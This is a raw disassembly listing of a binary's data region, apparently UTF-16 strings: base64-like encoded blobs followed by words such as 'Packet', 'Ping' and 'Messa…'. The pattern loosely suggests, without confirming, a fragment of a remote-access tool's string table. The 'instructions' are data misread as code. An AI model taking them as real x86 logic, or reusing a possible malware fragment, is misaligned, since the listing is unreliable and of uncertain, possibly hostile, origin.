  40b1b9:	00 65 00             	add    %ah,0x0(%ebp)
  40b1bc:	78 00                	js     0x40b1be
  40b1be:	58                   	pop    %eax
  40b1bf:	00 53 00             	add    %dl,0x0(%ebx)
  40b1c2:	57                   	push   %edi
  40b1c3:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40b1c7:	00 38                	add    %bh,(%eax)
  40b1c9:	00 4e 00             	add    %cl,0x0(%esi)
  40b1cc:	44                   	inc    %esp
  40b1cd:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1d0:	42                   	inc    %edx
  40b1d1:	00 55 00             	add    %dl,0x0(%ebp)
  40b1d4:	70 00                	jo     0x40b1d6
  40b1d6:	53                   	push   %ebx
  40b1d7:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40b1db:	00 68 00             	add    %ch,0x0(%eax)
  40b1de:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40b1e2:	51                   	push   %ecx
  40b1e3:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b1e7:	00 71 00             	add    %dh,0x0(%ecx)
  40b1ea:	61                   	popa
  40b1eb:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40b1ef:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1f2:	62 00                	bound  %eax,(%eax)
  40b1f4:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40b1f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1f9:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1fc:	4e                   	dec    %esi
  40b1fd:	00 2b                	add    %ch,(%ebx)
  40b1ff:	00 50 00             	add    %dl,0x0(%eax)
  40b202:	4a                   	dec    %edx
  40b203:	00 57 00             	add    %dl,0x0(%edi)
  40b206:	62 00                	bound  %eax,(%eax)
  40b208:	45                   	inc    %ebp
  40b209:	00 61 00             	add    %ah,0x0(%ecx)
  40b20c:	43                   	inc    %ebx
  40b20d:	00 50 00             	add    %dl,0x0(%eax)
  40b210:	57                   	push   %edi
  40b211:	00 36                	add    %dh,(%esi)
  40b213:	00 42 00             	add    %al,0x0(%edx)
  40b216:	38 00                	cmp    %al,(%eax)
  40b218:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40b21c:	49                   	dec    %ecx
  40b21d:	00 50 00             	add    %dl,0x0(%eax)
  40b220:	41                   	inc    %ecx
  40b221:	00 46 00             	add    %al,0x0(%esi)
  40b224:	67 00 37             	add    %dh,(%bx)
  40b227:	00 72 00             	add    %dh,0x0(%edx)
  40b22a:	6d                   	insl   (%dx),%es:(%edi)
  40b22b:	00 52 00             	add    %dl,0x0(%edx)
  40b22e:	54                   	push   %esp
  40b22f:	00 63 00             	add    %ah,0x0(%ebx)
  40b232:	71 00                	jno    0x40b234
  40b234:	46                   	inc    %esi
  40b235:	00 6f 00             	add    %ch,0x0(%edi)
  40b238:	75 00                	jne    0x40b23a
  40b23a:	2f                   	das
  40b23b:	00 2f                	add    %ch,(%edi)
  40b23d:	00 6a 00             	add    %ch,0x0(%edx)
  40b240:	32 00                	xor    (%eax),%al
  40b242:	63 00                	arpl   %eax,(%eax)
  40b244:	47                   	inc    %edi
  40b245:	00 63 00             	add    %ah,0x0(%ebx)
  40b248:	34 00                	xor    $0x0,%al
  40b24a:	2f                   	das
  40b24b:	00 31                	add    %dh,(%ecx)
  40b24d:	00 53 00             	add    %dl,0x0(%ebx)
  40b250:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40b254:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40b258:	66 00 64 00 5a       	data16 add %ah,0x5a(%eax,%eax,1)
  40b25d:	00 76 00             	add    %dh,0x0(%esi)
  40b260:	46                   	inc    %esi
  40b261:	00 5a 00             	add    %bl,0x0(%edx)
  40b264:	45                   	inc    %ebp
  40b265:	00 5a 00             	add    %bl,0x0(%edx)
  40b268:	75 00                	jne    0x40b26a
  40b26a:	64 00 54 00 41       	add    %dl,%fs:0x41(%eax,%eax,1)
  40b26f:	00 2b                	add    %ch,(%ebx)
  40b271:	00 51 00             	add    %dl,0x0(%ecx)
  40b274:	57                   	push   %edi
  40b275:	00 4a 00             	add    %cl,0x0(%edx)
  40b278:	44                   	inc    %esp
  40b279:	00 46 00             	add    %al,0x0(%esi)
  40b27c:	68 00 55 00 62       	push   $0x62005500
  40b281:	00 37                	add    %dh,(%edi)
  40b283:	00 59 00             	add    %bl,0x0(%ecx)
  40b286:	6e                   	outsb  %ds:(%esi),(%dx)
  40b287:	00 37                	add    %dh,(%edi)
  40b289:	00 49 00             	add    %cl,0x0(%ecx)
  40b28c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b28d:	00 46 00             	add    %al,0x0(%esi)
  40b290:	6e                   	outsb  %ds:(%esi),(%dx)
  40b291:	00 65 00             	add    %ah,0x0(%ebp)
  40b294:	71 00                	jno    0x40b296
  40b296:	58                   	pop    %eax
  40b297:	00 79 00             	add    %bh,0x0(%ecx)
  40b29a:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40b29e:	63 00                	arpl   %eax,(%eax)
  40b2a0:	67 00 31             	add    %dh,(%bx,%di)
  40b2a3:	00 65 00             	add    %ah,0x0(%ebp)
  40b2a6:	73 00                	jae    0x40b2a8
  40b2a8:	75 00                	jne    0x40b2aa
  40b2aa:	46                   	inc    %esi
  40b2ab:	00 38                	add    %bh,(%eax)
  40b2ad:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40b2b1:	00 41 00             	add    %al,0x0(%ecx)
  40b2b4:	43                   	inc    %ebx
  40b2b5:	00 2b                	add    %ch,(%ebx)
  40b2b7:	00 6f 00             	add    %ch,0x0(%edi)
  40b2ba:	70 00                	jo     0x40b2bc
  40b2bc:	43                   	inc    %ebx
  40b2bd:	00 2b                	add    %ch,(%ebx)
  40b2bf:	00 62 00             	add    %ah,0x0(%edx)
  40b2c2:	79 00                	jns    0x40b2c4
  40b2c4:	67 00 66 00          	add    %ah,0x0(%bp)
  40b2c8:	32 00                	xor    (%eax),%al
  40b2ca:	43                   	inc    %ebx
  40b2cb:	00 42 00             	add    %al,0x0(%edx)
  40b2ce:	50                   	push   %eax
  40b2cf:	00 7a 00             	add    %bh,0x0(%edx)
  40b2d2:	57                   	push   %edi
  40b2d3:	00 79 00             	add    %bh,0x0(%ecx)
  40b2d6:	49                   	dec    %ecx
  40b2d7:	00 45 00             	add    %al,0x0(%ebp)
  40b2da:	45                   	inc    %ebp
  40b2db:	00 6a 00             	add    %ch,0x0(%edx)
  40b2de:	30 00                	xor    %al,(%eax)
  40b2e0:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b2e3:	00 47 00             	add    %al,0x0(%edi)
  40b2e6:	33 00                	xor    (%eax),%eax
  40b2e8:	67 00 36 00 54       	add    %dh,0x5400
  40b2ed:	00 6d 00             	add    %ch,0x0(%ebp)
  40b2f0:	5a                   	pop    %edx
  40b2f1:	00 72 00             	add    %dh,0x0(%edx)
  40b2f4:	70 00                	jo     0x40b2f6
  40b2f6:	35 00 6c 00 55       	xor    $0x55006c00,%eax
  40b2fb:	00 51 00             	add    %dl,0x0(%ecx)
  40b2fe:	43                   	inc    %ebx
  40b2ff:	00 4d 00             	add    %cl,0x0(%ebp)
  40b302:	55                   	push   %ebp
  40b303:	00 66 00             	add    %ah,0x0(%esi)
  40b306:	7a 00                	jp     0x40b308
  40b308:	38 00                	cmp    %al,(%eax)
  40b30a:	4e                   	dec    %esi
  40b30b:	00 62 00             	add    %ah,0x0(%edx)
  40b30e:	5a                   	pop    %edx
  40b30f:	00 53 00             	add    %dl,0x0(%ebx)
  40b312:	35 00 78 00 54       	xor    $0x54007800,%eax
  40b317:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40b31b:	00 4f 00             	add    %cl,0x0(%edi)
  40b31e:	49                   	dec    %ecx
  40b31f:	00 63 00             	add    %ah,0x0(%ebx)
  40b322:	38 00                	cmp    %al,(%eax)
  40b324:	75 00                	jne    0x40b326
  40b326:	76 00                	jbe    0x40b328
  40b328:	47                   	inc    %edi
  40b329:	00 71 00             	add    %dh,0x0(%ecx)
  40b32c:	53                   	push   %ebx
  40b32d:	00 52 00             	add    %dl,0x0(%edx)
  40b330:	43                   	inc    %ebx
  40b331:	00 78 00             	add    %bh,0x0(%eax)
  40b334:	4f                   	dec    %edi
  40b335:	00 72 00             	add    %dh,0x0(%edx)
  40b338:	44                   	inc    %esp
  40b339:	00 45 00             	add    %al,0x0(%ebp)
  40b33c:	53                   	push   %ebx
  40b33d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b340:	75 00                	jne    0x40b342
  40b342:	7a 00                	jp     0x40b344
  40b344:	4b                   	dec    %ebx
  40b345:	00 57 00             	add    %dl,0x0(%edi)
  40b348:	6b 00 33             	imul   $0x33,(%eax),%eax
  40b34b:	00 6e 00             	add    %ch,0x0(%esi)
  40b34e:	32 00                	xor    (%eax),%al
  40b350:	46                   	inc    %esi
  40b351:	00 51 00             	add    %dl,0x0(%ecx)
  40b354:	5a                   	pop    %edx
  40b355:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b358:	41                   	inc    %ecx
  40b359:	00 7a 00             	add    %bh,0x0(%edx)
  40b35c:	66 00 74 00 65       	data16 add %dh,0x65(%eax,%eax,1)
  40b361:	00 32                	add    %dh,(%edx)
  40b363:	00 65 00             	add    %ah,0x0(%ebp)
  40b366:	6e                   	outsb  %ds:(%esi),(%dx)
  40b367:	00 4e 00             	add    %cl,0x0(%esi)
  40b36a:	73 00                	jae    0x40b36c
  40b36c:	7a 00                	jp     0x40b36e
  40b36e:	46                   	inc    %esi
  40b36f:	00 61 00             	add    %ah,0x0(%ecx)
  40b372:	41                   	inc    %ecx
  40b373:	00 76 00             	add    %dh,0x0(%esi)
  40b376:	49                   	dec    %ecx
  40b377:	00 59 00             	add    %bl,0x0(%ecx)
  40b37a:	77 00                	ja     0x40b37c
  40b37c:	6b 00 45             	imul   $0x45,(%eax),%eax
  40b37f:	00 78 00             	add    %bh,0x0(%eax)
  40b382:	69 00 33 00 58 00    	imul   $0x580033,(%eax),%eax
  40b388:	75 00                	jne    0x40b38a
  40b38a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b38b:	00 6b 00             	add    %ch,0x0(%ebx)
  40b38e:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b392:	2f                   	das
  40b393:	00 6f 00             	add    %ch,0x0(%edi)
  40b396:	72 00                	jb     0x40b398
  40b398:	63 00                	arpl   %eax,(%eax)
  40b39a:	44                   	inc    %esp
  40b39b:	00 36                	add    %dh,(%esi)
  40b39d:	00 65 00             	add    %ah,0x0(%ebp)
  40b3a0:	57                   	push   %edi
  40b3a1:	00 6e 00             	add    %ch,0x0(%esi)
  40b3a4:	53                   	push   %ebx
  40b3a5:	00 30                	add    %dh,(%eax)
  40b3a7:	00 53 00             	add    %dl,0x0(%ebx)
  40b3aa:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40b3ae:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40b3b2:	47                   	inc    %edi
  40b3b3:	00 59 00             	add    %bl,0x0(%ecx)
  40b3b6:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40b3ba:	54                   	push   %esp
  40b3bb:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3be:	2b 00                	sub    (%eax),%eax
  40b3c0:	75 00                	jne    0x40b3c2
  40b3c2:	41                   	inc    %ecx
  40b3c3:	00 50 00             	add    %dl,0x0(%eax)
  40b3c6:	30 00                	xor    %al,(%eax)
  40b3c8:	5a                   	pop    %edx
  40b3c9:	00 72 00             	add    %dh,0x0(%edx)
  40b3cc:	47                   	inc    %edi
  40b3cd:	00 58 00             	add    %bl,0x0(%eax)
  40b3d0:	4b                   	dec    %ebx
  40b3d1:	00 38                	add    %bh,(%eax)
  40b3d3:	00 69 00             	add    %ch,0x0(%ecx)
  40b3d6:	50                   	push   %eax
  40b3d7:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40b3db:	00 2b                	add    %ch,(%ebx)
  40b3dd:	00 30                	add    %dh,(%eax)
  40b3df:	00 5a 00             	add    %bl,0x0(%edx)
  40b3e2:	65 00 38             	add    %bh,%gs:(%eax)
  40b3e5:	00 71 00             	add    %dh,0x0(%ecx)
  40b3e8:	52                   	push   %edx
  40b3e9:	00 76 00             	add    %dh,0x0(%esi)
  40b3ec:	72 00                	jb     0x40b3ee
  40b3ee:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3ef:	00 69 00             	add    %ch,0x0(%ecx)
  40b3f2:	53                   	push   %ebx
  40b3f3:	00 77 00             	add    %dh,0x0(%edi)
  40b3f6:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b3fb:	80 b1 4a 00 49 00 72 	xorb   $0x72,0x49004a(%ecx)
  40b402:	00 45 00             	add    %al,0x0(%ebp)
  40b405:	63 00                	arpl   %eax,(%eax)
  40b407:	63 00                	arpl   %eax,(%eax)
  40b409:	69 00 47 00 41 00    	imul   $0x410047,(%eax),%eax
  40b40f:	2f                   	das
  40b410:	00 49 00             	add    %cl,0x0(%ecx)
  40b413:	33 00                	xor    (%eax),%eax
  40b415:	31 00                	xor    %eax,(%eax)
  40b417:	42                   	inc    %edx
  40b418:	00 42 00             	add    %al,0x0(%edx)
  40b41b:	46                   	inc    %esi
  40b41c:	00 53 00             	add    %dl,0x0(%ebx)
  40b41f:	78 00                	js     0x40b421
  40b421:	6c                   	insb   (%dx),%es:(%edi)
  40b422:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40b426:	00 31                	add    %dh,(%ecx)
  40b428:	00 70 00             	add    %dh,0x0(%eax)
  40b42b:	71 00                	jno    0x40b42d
  40b42d:	4e                   	dec    %esi
  40b42e:	00 72 00             	add    %dh,0x0(%edx)
  40b431:	4c                   	dec    %esp
  40b432:	00 6f 00             	add    %ch,0x0(%edi)
  40b435:	6d                   	insl   (%dx),%es:(%edi)
  40b436:	00 77 00             	add    %dh,0x0(%edi)
  40b439:	65 00 39             	add    %bh,%gs:(%ecx)
  40b43c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b43f:	58                   	pop    %eax
  40b440:	00 61 00             	add    %ah,0x0(%ecx)
  40b443:	55                   	push   %ebp
  40b444:	00 4b 00             	add    %cl,0x0(%ebx)
  40b447:	33 00                	xor    (%eax),%eax
  40b449:	59                   	pop    %ecx
  40b44a:	00 33                	add    %dh,(%ebx)
  40b44c:	00 71 00             	add    %dh,0x0(%ecx)
  40b44f:	6c                   	insb   (%dx),%es:(%edi)
  40b450:	00 2f                	add    %ch,(%edi)
  40b452:	00 43 00             	add    %al,0x0(%ebx)
  40b455:	73 00                	jae    0x40b457
  40b457:	6b 00 75             	imul   $0x75,(%eax),%eax
  40b45a:	00 67 00             	add    %ah,0x0(%edi)
  40b45d:	43                   	inc    %ebx
  40b45e:	00 61 00             	add    %ah,0x0(%ecx)
  40b461:	41                   	inc    %ecx
  40b462:	00 56 00             	add    %dl,0x0(%esi)
  40b465:	52                   	push   %edx
  40b466:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b469:	41                   	inc    %ecx
  40b46a:	00 72 00             	add    %dh,0x0(%edx)
  40b46d:	4f                   	dec    %edi
  40b46e:	00 78 00             	add    %bh,0x0(%eax)
  40b471:	56                   	push   %esi
  40b472:	00 4b 00             	add    %cl,0x0(%ebx)
  40b475:	44                   	inc    %esp
  40b476:	00 68 00             	add    %ch,0x0(%eax)
  40b479:	4a                   	dec    %edx
  40b47a:	00 4e 00             	add    %cl,0x0(%esi)
  40b47d:	6a 00                	push   $0x0
  40b47f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b480:	00 33                	add    %dh,(%ebx)
  40b482:	00 65 00             	add    %ah,0x0(%ebp)
  40b485:	75 00                	jne    0x40b487
  40b487:	6c                   	insb   (%dx),%es:(%edi)
  40b488:	00 33                	add    %dh,(%ebx)
  40b48a:	00 56 00             	add    %dl,0x0(%esi)
  40b48d:	57                   	push   %edi
  40b48e:	00 35 00 57 00 4f    	add    %dh,0x4f005700
  40b494:	00 2b                	add    %ch,(%ebx)
  40b496:	00 63 00             	add    %ah,0x0(%ebx)
  40b499:	43                   	inc    %ebx
  40b49a:	00 30                	add    %dh,(%eax)
  40b49c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b49f:	34 00                	xor    $0x0,%al
  40b4a1:	44                   	inc    %esp
  40b4a2:	00 33                	add    %dh,(%ebx)
  40b4a4:	00 57 00             	add    %dl,0x0(%edi)
  40b4a7:	51                   	push   %ecx
  40b4a8:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b4ae:	80 b1 78 00 50 00 65 	xorb   $0x65,0x500078(%ecx)
  40b4b5:	00 50 00             	add    %dl,0x0(%eax)
  40b4b8:	54                   	push   %esp
  40b4b9:	00 2b                	add    %ch,(%ebx)
  40b4bb:	00 58 00             	add    %bl,0x0(%eax)
  40b4be:	4d                   	dec    %ebp
  40b4bf:	00 75 00             	add    %dh,0x0(%ebp)
  40b4c2:	6c                   	insb   (%dx),%es:(%edi)
  40b4c3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4c6:	31 00                	xor    %eax,(%eax)
  40b4c8:	2f                   	das
  40b4c9:	00 39                	add    %bh,(%ecx)
  40b4cb:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4ce:	31 00                	xor    %eax,(%eax)
  40b4d0:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b4d4:	46                   	inc    %esi
  40b4d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4d8:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b4dc:	73 00                	jae    0x40b4de
  40b4de:	49                   	dec    %ecx
  40b4df:	00 37                	add    %dh,(%edi)
  40b4e1:	00 52 00             	add    %dl,0x0(%edx)
  40b4e4:	43                   	inc    %ebx
  40b4e5:	00 53 00             	add    %dl,0x0(%ebx)
  40b4e8:	6c                   	insb   (%dx),%es:(%edi)
  40b4e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4ec:	4d                   	dec    %ebp
  40b4ed:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4f0:	50                   	push   %eax
  40b4f1:	00 57 00             	add    %dl,0x0(%edi)
  40b4f4:	6b 00 70             	imul   $0x70,(%eax),%eax
  40b4f7:	00 6f 00             	add    %ch,0x0(%edi)
  40b4fa:	72 00                	jb     0x40b4fc
  40b4fc:	2b 00                	sub    (%eax),%eax
  40b4fe:	57                   	push   %edi
  40b4ff:	00 71 00             	add    %dh,0x0(%ecx)
  40b502:	51                   	push   %ecx
  40b503:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b506:	32 00                	xor    (%eax),%al
  40b508:	6f                   	outsl  %ds:(%esi),(%dx)
  40b509:	00 5a 00             	add    %bl,0x0(%edx)
  40b50c:	48                   	dec    %eax
  40b50d:	00 65 00             	add    %ah,0x0(%ebp)
  40b510:	4d                   	dec    %ebp
  40b511:	00 49 00             	add    %cl,0x0(%ecx)
  40b514:	78 00                	js     0x40b516
  40b516:	75 00                	jne    0x40b518
  40b518:	55                   	push   %ebp
  40b519:	00 5a 00             	add    %bl,0x0(%edx)
  40b51c:	43                   	inc    %ebx
  40b51d:	00 6f 00             	add    %ch,0x0(%edi)
  40b520:	61                   	popa
  40b521:	00 55 00             	add    %dl,0x0(%ebp)
  40b524:	56                   	push   %esi
  40b525:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b529:	00 6b 00             	add    %ch,0x0(%ebx)
  40b52c:	6b 00 31             	imul   $0x31,(%eax),%eax
  40b52f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b532:	64 00 2b             	add    %ch,%fs:(%ebx)
  40b535:	00 31                	add    %dh,(%ecx)
  40b537:	00 4b 00             	add    %cl,0x0(%ebx)
  40b53a:	4b                   	dec    %ebx
  40b53b:	00 4b 00             	add    %cl,0x0(%ebx)
  40b53e:	4a                   	dec    %edx
  40b53f:	00 77 00             	add    %dh,0x0(%edi)
  40b542:	70 00                	jo     0x40b544
  40b544:	52                   	push   %edx
  40b545:	00 2f                	add    %ch,(%edi)
  40b547:	00 52 00             	add    %dl,0x0(%edx)
  40b54a:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b54e:	2f                   	das
  40b54f:	00 58 00             	add    %bl,0x0(%eax)
  40b552:	4c                   	dec    %esp
  40b553:	00 48 00             	add    %cl,0x0(%eax)
  40b556:	68 00 66 00 67       	push   $0x67006600
  40b55b:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b561:	80 b1 65 00 39 00 55 	xorb   $0x55,0x390065(%ecx)
  40b568:	00 50 00             	add    %dl,0x0(%eax)
  40b56b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b56c:	00 37                	add    %dh,(%edi)
  40b56e:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40b572:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40b576:	00 79 00             	add    %bh,0x0(%ecx)
  40b579:	56                   	push   %esi
  40b57a:	00 56 00             	add    %dl,0x0(%esi)
  40b57d:	31 00                	xor    %eax,(%eax)
  40b57f:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40b583:	6a 00                	push   $0x0
  40b585:	51                   	push   %ecx
  40b586:	00 2b                	add    %ch,(%ebx)
  40b588:	00 32                	add    %dh,(%edx)
  40b58a:	00 41 00             	add    %al,0x0(%ecx)
  40b58d:	6d                   	insl   (%dx),%es:(%edi)
  40b58e:	00 77 00             	add    %dh,0x0(%edi)
  40b591:	6f                   	outsl  %ds:(%esi),(%dx)
  40b592:	00 41 00             	add    %al,0x0(%ecx)
  40b595:	76 00                	jbe    0x40b597
  40b597:	73 00                	jae    0x40b599
  40b599:	4b                   	dec    %ebx
  40b59a:	00 51 00             	add    %dl,0x0(%ecx)
  40b59d:	58                   	pop    %eax
  40b59e:	00 6f 00             	add    %ch,0x0(%edi)
  40b5a1:	6a 00                	push   $0x0
  40b5a3:	39 00                	cmp    %eax,(%eax)
  40b5a5:	59                   	pop    %ecx
  40b5a6:	00 58 00             	add    %bl,0x0(%eax)
  40b5a9:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b5ad:	31 00                	xor    %eax,(%eax)
  40b5af:	37                   	aaa
  40b5b0:	00 78 00             	add    %bh,0x0(%eax)
  40b5b3:	71 00                	jno    0x40b5b5
  40b5b5:	7a 00                	jp     0x40b5b7
  40b5b7:	50                   	push   %eax
  40b5b8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5bb:	52                   	push   %edx
  40b5bc:	00 76 00             	add    %dh,0x0(%esi)
  40b5bf:	70 00                	jo     0x40b5c1
  40b5c1:	43                   	inc    %ebx
  40b5c2:	00 48 00             	add    %cl,0x0(%eax)
  40b5c5:	2f                   	das
  40b5c6:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40b5ca:	00 72 00             	add    %dh,0x0(%edx)
  40b5cd:	63 00                	arpl   %eax,(%eax)
  40b5cf:	63 00                	arpl   %eax,(%eax)
  40b5d1:	53                   	push   %ebx
  40b5d2:	00 45 00             	add    %al,0x0(%ebp)
  40b5d5:	5a                   	pop    %edx
  40b5d6:	00 33                	add    %dh,(%ebx)
  40b5d8:	00 56 00             	add    %dl,0x0(%esi)
  40b5db:	78 00                	js     0x40b5dd
  40b5dd:	33 00                	xor    (%eax),%eax
  40b5df:	6a 00                	push   $0x0
  40b5e1:	78 00                	js     0x40b5e3
  40b5e3:	48                   	dec    %eax
  40b5e4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5e7:	56                   	push   %esi
  40b5e8:	00 47 00             	add    %al,0x0(%edi)
  40b5eb:	34 00                	xor    $0x0,%al
  40b5ed:	44                   	inc    %esp
  40b5ee:	00 62 00             	add    %ah,0x0(%edx)
  40b5f1:	4b                   	dec    %ebx
  40b5f2:	00 69 00             	add    %ch,0x0(%ecx)
  40b5f5:	31 00                	xor    %eax,(%eax)
  40b5f7:	35 00 76 00 4c       	xor    $0x4c007600,%eax
  40b5fc:	00 7a 00             	add    %bh,0x0(%edx)
  40b5ff:	56                   	push   %esi
  40b600:	00 4d 00             	add    %cl,0x0(%ebp)
  40b603:	31 00                	xor    %eax,(%eax)
  40b605:	32 00                	xor    (%eax),%al
  40b607:	44                   	inc    %esp
  40b608:	00 32                	add    %dh,(%edx)
  40b60a:	00 50 00             	add    %dl,0x0(%eax)
  40b60d:	77 00                	ja     0x40b60f
  40b60f:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b614:	03 33                	add    (%ebx),%esi
  40b616:	00 00                	add    %al,(%eax)
  40b618:	80 b1 52 00 50 00 64 	xorb   $0x64,0x500052(%ecx)
  40b61f:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40b623:	00 71 00             	add    %dh,0x0(%ecx)
  40b626:	71 00                	jno    0x40b628
  40b628:	41                   	inc    %ecx
  40b629:	00 50 00             	add    %dl,0x0(%eax)
  40b62c:	47                   	inc    %edi
  40b62d:	00 73 00             	add    %dh,0x0(%ebx)
  40b630:	4c                   	dec    %esp
  40b631:	00 73 00             	add    %dh,0x0(%ebx)
  40b634:	4c                   	dec    %esp
  40b635:	00 4b 00             	add    %cl,0x0(%ebx)
  40b638:	69 00 31 00 71 00    	imul   $0x710031,(%eax),%eax
  40b63e:	41                   	inc    %ecx
  40b63f:	00 65 00             	add    %ah,0x0(%ebp)
  40b642:	2b 00                	sub    (%eax),%eax
  40b644:	57                   	push   %edi
  40b645:	00 76 00             	add    %dh,0x0(%esi)
  40b648:	33 00                	xor    (%eax),%eax
  40b64a:	32 00                	xor    (%eax),%al
  40b64c:	51                   	push   %ecx
  40b64d:	00 69 00             	add    %ch,0x0(%ecx)
  40b650:	6d                   	insl   (%dx),%es:(%edi)
  40b651:	00 53 00             	add    %dl,0x0(%ebx)
  40b654:	6d                   	insl   (%dx),%es:(%edi)
  40b655:	00 66 00             	add    %ah,0x0(%esi)
  40b658:	2f                   	das
  40b659:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40b65d:	00 4e 00             	add    %cl,0x0(%esi)
  40b660:	6f                   	outsl  %ds:(%esi),(%dx)
  40b661:	00 68 00             	add    %ch,0x0(%eax)
  40b664:	56                   	push   %esi
  40b665:	00 46 00             	add    %al,0x0(%esi)
  40b668:	4b                   	dec    %ebx
  40b669:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b66d:	00 32                	add    %dh,(%edx)
  40b66f:	00 59 00             	add    %bl,0x0(%ecx)
  40b672:	76 00                	jbe    0x40b674
  40b674:	4b                   	dec    %ebx
  40b675:	00 6d 00             	add    %ch,0x0(%ebp)
  40b678:	52                   	push   %edx
  40b679:	00 61 00             	add    %ah,0x0(%ecx)
  40b67c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b67d:	00 66 00             	add    %ah,0x0(%esi)
  40b680:	32 00                	xor    (%eax),%al
  40b682:	67 00 75 00          	add    %dh,0x0(%di)
  40b686:	70 00                	jo     0x40b688
  40b688:	42                   	inc    %edx
  40b689:	00 73 00             	add    %dh,0x0(%ebx)
  40b68c:	6c                   	insb   (%dx),%es:(%edi)
  40b68d:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40b691:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40b695:	00 73 00             	add    %dh,0x0(%ebx)
  40b698:	6e                   	outsb  %ds:(%esi),(%dx)
  40b699:	00 2f                	add    %ch,(%edi)
  40b69b:	00 2b                	add    %ch,(%ebx)
  40b69d:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40b6a1:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6a4:	6d                   	insl   (%dx),%es:(%edi)
  40b6a5:	00 65 00             	add    %ah,0x0(%ebp)
  40b6a8:	50                   	push   %eax
  40b6a9:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40b6ad:	00 53 00             	add    %dl,0x0(%ebx)
  40b6b0:	55                   	push   %ebp
  40b6b1:	00 41 00             	add    %al,0x0(%ecx)
  40b6b4:	6d                   	insl   (%dx),%es:(%edi)
  40b6b5:	00 30                	add    %dh,(%eax)
  40b6b7:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40b6bb:	00 4a 00             	add    %cl,0x0(%edx)
  40b6be:	77 00                	ja     0x40b6c0
  40b6c0:	39 00                	cmp    %eax,(%eax)
  40b6c2:	58                   	pop    %eax
  40b6c3:	00 41 00             	add    %al,0x0(%ecx)
  40b6c6:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b6cb:	09 6e 00             	or     %ebp,0x0(%esi)
  40b6ce:	75 00                	jne    0x40b6d0
  40b6d0:	6c                   	insb   (%dx),%es:(%edi)
  40b6d1:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b6d5:	03 3a                	add    (%edx),%edi
  40b6d7:	00 00                	add    %al,(%eax)
  40b6d9:	0d 50 00 61 00       	or     $0x610050,%eax
  40b6de:	63 00                	arpl   %eax,(%eax)
  40b6e0:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b6e3:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b6e7:	09 50 00             	or     %edx,0x0(%eax)
  40b6ea:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b6f0:	00 0f                	add    %cl,(%edi)
  40b6f2:	4d                   	dec    %ebp
  40b6f3:	00 65 00             	add    %ah,0x0(%ebp)
  40b6f6:	73 00                	jae    0x40b6f8
  40b6f8:	73 00                	jae    0x40b6fa
  40b6fa:	61                   	popa
